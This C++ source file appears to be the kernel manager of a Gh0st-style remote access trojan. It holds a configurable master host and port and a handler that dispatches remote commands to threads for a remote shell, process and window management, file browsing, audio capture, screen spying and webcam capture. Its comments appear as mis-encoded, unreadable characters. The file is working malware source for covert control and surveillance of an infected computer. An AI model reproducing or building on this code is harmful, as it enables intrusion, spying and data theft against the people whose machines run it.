#include "StdAfx.h"
#include "KernelManager.h"
#include "Common.h"


char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;


CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
			   LPCTSTR lpszMasterHost, UINT nMasterPort): CManager(pClient)
{



	if (lpszMasterHost != NULL)
	{
		lstrcpy(m_strMasterHost, lpszMasterHost);
	}
	
	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		{
			InterlockedExchange((LONG *)&m_bIsActived, true);
			break;
		}

	case COMMAND_SHELL:  //Զ���ն�
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopShellManager, 
				(LPVOID)m_pClient->m_Socket, 0, NULL, true);
			break;
		}
	case COMMAND_SYSTEM:       //Զ�̽��̹���
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopSystemManager,
				(LPVOID)m_pClient->m_Socket, 0, NULL);
			break;
		}

	case COMMAND_WSLIST:       //Զ�̴��ڹ���
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopWindowManager,
				(LPVOID)m_pClient->m_Socket, 0, NULL);
			break;

		}

	case COMMAND_LIST_DRIVE:  //Զ���ļ�����
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopFileManager, 
				(LPVOID)m_pClient->m_Socket, 0, NULL, false);
			break;
		}


	case COMMAND_AUDIO:		  //Զ����Ƶ���� 
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopAudioManager,
				(LPVOID)m_pClient->m_Socket, 0, NULL);
			break;
		}

	case COMMAND_SCREEN_SPY: //Զ����Ļ�鿴
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
				(LPVOID)m_pClient->m_Socket, 0, NULL, true);
			break;
		}
		
	case COMMAND_WEBCAM:
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopVideoManager,
				(LPVOID)m_pClient->m_Socket, 0, NULL, true);
			break;

		}
	}
}
bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}